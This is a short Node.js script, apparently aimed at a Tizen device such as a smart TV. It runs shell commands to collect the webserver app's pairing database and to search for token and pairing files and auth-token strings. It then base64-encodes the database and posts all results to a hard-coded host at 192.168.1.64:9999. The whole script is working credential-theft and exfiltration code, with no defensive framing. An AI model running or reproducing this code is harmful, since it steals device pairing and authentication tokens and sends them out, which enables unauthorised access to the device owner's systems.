"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body, cb) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); if (cb) cb(null); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); if (cb) cb(e); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 10000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.pairings = sh("cat /opt/usr/apps/org.tizen.webserver/data/db/.pairings.db 2>/dev/null | base64 | head -c 3000; echo; echo ===; ls -la /opt/usr/apps/org.tizen.webserver/data/db/ 2>&1");
out.token_files = sh("find /opt/var /opt/usr /home/owner -maxdepth 6 \\( -iname '*token*' -o -iname '*pairing*' \\) -size -3M 2>/dev/null | head -25");
out.msf = sh("find /opt/usr/apps /usr/apps -maxdepth 2 -iname '*msf*' -o -maxdepth 2 -iname '*remote*' -o -maxdepth 2 -iname '*multi*' 2>/dev/null | head -15; echo ===; ls -la /opt/usr/apps/org.tizen.webserver/data/ 2>/dev/null | head -15");
out.grep_tok = sh("grep -r -a -l -iE 'remotetoken|deviceToken|auth_token|\"token\"' /opt/var/lib /opt/usr/data /opt/usr/apps/org.tizen.webserver /home/owner/share 2>/dev/null | head -15");
post("/tok1", out);

var pull = {};
pull.started = out.started;
try {
    var buf = fs.readFileSync("/opt/usr/apps/org.tizen.webserver/data/db/.pairings.db");
    pull.pairings_b64 = buf.toString("base64");
} catch (e) { pull.pairings_err = String(e.message || e); }
post("/tok2", pull);
post("/tok_done", { started: out.started });
